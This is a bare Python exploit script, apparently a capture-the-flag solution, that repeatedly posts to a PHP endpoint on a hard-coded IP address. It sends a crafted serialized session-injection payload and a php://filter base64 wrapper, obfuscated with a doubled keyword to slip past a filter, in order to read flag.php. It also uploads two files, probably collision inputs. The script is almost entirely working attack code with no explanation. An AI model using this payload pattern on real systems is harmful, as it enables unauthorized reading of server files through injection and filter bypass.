import requests
s = requests.session()
proxies = {"http": "http://127.0.0.1:8080"}
def post1():

      url1="http://47.94.14.162:10007/guess_time.php"

      payload='sss";s:1:"1";s:8:"function";s:4:"hack";s:4:"file";s:57:"php://filter/read=convert.babase64se64-encode/resource=flag.php";}'

      f1=open("a.txt",'rb')
      f2=open("b.txt",'rb')

      data={"param1": f1.read(),
            "param2": f2.read(),
            "_SESSION[base64base64]":payload,
            "_SESSION[file]":"time.php",
            "_SESSION[function]":"hack"
      }

      # while True:
      r = s.post(url1, data=data)
            # if "PD" in r.text:
      print(r.text)

while True:
      post1()